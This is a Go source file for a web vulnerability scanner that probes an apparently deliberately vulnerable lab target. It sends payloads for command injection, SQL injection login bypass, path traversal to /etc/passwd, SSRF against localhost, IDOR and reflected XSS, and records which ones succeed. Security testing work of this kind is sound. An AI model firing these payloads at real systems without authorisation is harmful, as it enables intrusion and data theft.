package scanner

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type VulnerabilityFinding struct {
	Name     string `json:"name"`
	Severity string `json:"severity"`
	CVSS     string `json:"cvss"`
	Endpoint string `json:"endpoint"`
	Payload  string `json:"payload"`
	Proof    string `json:"proof"`
	Status   string `json:"status"`
}

type WebAssessmentCheck struct {
	Name     string `json:"name"`
	Endpoint string `json:"endpoint"`
	Status   string `json:"status"`
	Detail   string `json:"detail"`
}

type WebAssessmentReport struct {
	Target               string                 `json:"target"`
	Timestamp            time.Time              `json:"timestamp"`
	TotalVulnerabilities int                    `json:"total_vulnerabilities"`
	Findings             []VulnerabilityFinding `json:"findings"`
	Checks               []WebAssessmentCheck   `json:"checks"`
	Errors               []string               `json:"errors"`
}

// RunWebExploitAssessment checks the intentionally vulnerable local web target.
func RunWebExploitAssessment(target string) WebAssessmentReport {
	report := WebAssessmentReport{
		Target:    target,
		Timestamp: time.Now().UTC(),
		Findings:  make([]VulnerabilityFinding, 0),
		Checks:    make([]WebAssessmentCheck, 0, 6),
		Errors:    make([]string, 0),
	}

	baseURL := target
	if !strings.Contains(baseURL, "://") {
		baseURL = "http://" + baseURL
	}
	parsedBase, err := url.Parse(baseURL)
	if err != nil || parsedBase.Host == "" || (parsedBase.Scheme != "http" && parsedBase.Scheme != "https") {
		report.Errors = append(report.Errors, "Invalid assessment target URL")
		report.TotalVulnerabilities = 0
		return report
	}
	baseURL = strings.TrimRight(baseURL, "/")

	client := &http.Client{Timeout: 5 * time.Second}
	probe := func(name, endpoint string, params url.Values, finding VulnerabilityFinding, verify func(string) (bool, string)) {
		check := WebAssessmentCheck{Name: name, Endpoint: endpoint}
		targetURL := baseURL + endpoint
		if len(params) > 0 {
			targetURL += "?" + params.Encode()
		}
		resp, err := client.Get(targetURL)
		if err != nil {
			check.Status = "ERROR"
			check.Detail = err.Error()
			report.Errors = append(report.Errors, fmt.Sprintf("%s: %s", name, err))
			report.Checks = append(report.Checks, check)
			return
		}
		body, readErr := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
		resp.Body.Close()
		if readErr != nil {
			check.Status = "ERROR"
			check.Detail = "Could not read target response: " + readErr.Error()
			report.Errors = append(report.Errors, fmt.Sprintf("%s: %s", name, readErr))
			report.Checks = append(report.Checks, check)
			return
		}
		if resp.StatusCode < http.StatusOK || resp.StatusCode >= http.StatusBadRequest {
			check.Status = "ERROR"
			check.Detail = fmt.Sprintf("Target returned HTTP %d; check that %s is served by the target container", resp.StatusCode, endpoint)
			report.Errors = append(report.Errors, fmt.Sprintf("%s returned HTTP %d", endpoint, resp.StatusCode))
			report.Checks = append(report.Checks, check)
			return
		}

		bodyText := string(body)
		if vulnerable, proof := verify(bodyText); vulnerable {
			finding.Endpoint = endpoint
			finding.Proof = proof
			finding.Status = "EXPLOITED_VERIFIED"
			report.Findings = append(report.Findings, finding)
			check.Status = "VULNERABLE"
			check.Detail = "The test payload was confirmed in the target response."
		} else {
			check.Status = "NOT_DETECTED"
			check.Detail = "The endpoint responded, but the test did not confirm this vulnerability."
		}
		report.Checks = append(report.Checks, check)
	}

	rcePayload := "printf CYBERSENTINEL_RCE_PROBE"
	rceParams := url.Values{"cmd": {rcePayload}}
	probe("OS command injection", "/os.php", rceParams, VulnerabilityFinding{
		Name: "OS Command Injection (Remote Code Execution)", Severity: "CRITICAL", CVSS: "9.8", Payload: rcePayload,
	}, func(body string) (bool, string) {
		return strings.Contains(body, "CYBERSENTINEL_RCE_PROBE"), strings.TrimSpace(body)
	})

	sqliPayload := "' OR '1'='1' -- "
	sqliParams := url.Values{"username": {sqliPayload}, "password": {"invalid"}}
	probe("SQL injection", "/sql.php", sqliParams, VulnerabilityFinding{
		Name: "SQL Injection Authentication Bypass", Severity: "HIGH", CVSS: "8.5", Payload: sqliPayload,
	}, func(body string) (bool, string) {
		return strings.Contains(body, `"status":"AUTHENTICATED"`) && strings.Contains(body, "admin"), strings.TrimSpace(body)
	})

	pathPayload := "/etc/passwd"
	pathParams := url.Values{"file": {pathPayload}}
	probe("Path traversal / local file read", "/path.php", pathParams, VulnerabilityFinding{
		Name: "Arbitrary File Read / Path Traversal", Severity: "HIGH", CVSS: "7.5", Payload: pathPayload,
	}, func(body string) (bool, string) {
		return strings.Contains(body, "root:x:0:0:"), "The response contains the root account entry from /etc/passwd."
	})

	ssrfPayload := "http://127.0.0.1/"
	ssrfParams := url.Values{"url": {ssrfPayload}}
	probe("Server-side request forgery", "/ssrf.php", ssrfParams, VulnerabilityFinding{
		Name: "Server-Side Request Forgery (SSRF)", Severity: "HIGH", CVSS: "8.6", Payload: ssrfPayload,
	}, func(body string) (bool, string) {
		return strings.Contains(body, "SSRF_FETCH_SUCCESS") && strings.Contains(body, "Welcome to the Internal Lab"), strings.TrimSpace(body)
	})

	idorParams := url.Values{"user_id": {"1"}}
	probe("Insecure direct object reference", "/profile.php", idorParams, VulnerabilityFinding{
		Name: "Insecure Direct Object Reference (IDOR)", Severity: "HIGH", CVSS: "8.1", Payload: "user_id=1",
	}, func(body string) (bool, string) {
		return strings.Contains(body, "FLAG{IDOR_ADMIN_DATA_LEAKED}") || strings.Contains(body, "SEC_KEY_live"), strings.TrimSpace(body)
	})

	xssPayload := "<script>alert('CYBERSENTINEL_XSS')</script>"
	xssParams := url.Values{"q": {xssPayload}}
	probe("Reflected cross-site scripting", "/search.php", xssParams, VulnerabilityFinding{
		Name: "Reflected Cross-Site Scripting (XSS)", Severity: "MEDIUM", CVSS: "7.2", Payload: xssPayload,
	}, func(body string) (bool, string) {
		return strings.Contains(body, xssPayload), "The raw script payload was reflected in the HTML response."
	})

	report.TotalVulnerabilities = len(report.Findings)
	return report
}
